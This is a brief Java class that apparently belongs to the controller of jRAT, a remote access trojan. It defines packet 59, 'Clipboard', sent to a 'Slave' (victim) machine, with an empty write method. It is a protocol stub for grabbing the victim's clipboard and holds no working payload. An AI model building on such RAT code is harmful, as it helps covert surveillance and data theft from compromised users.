package io.jrat.controller.packets.outgoing;

import io.jrat.controller.Slave;

import java.io.DataOutputStream;


public class Packet59Clipboard extends AbstractOutgoingPacket {

	@Override
	public void write(Slave slave, DataOutputStream dos) throws Exception {

	}

	@Override
	public short getPacketId() {
		return 59;
	}

}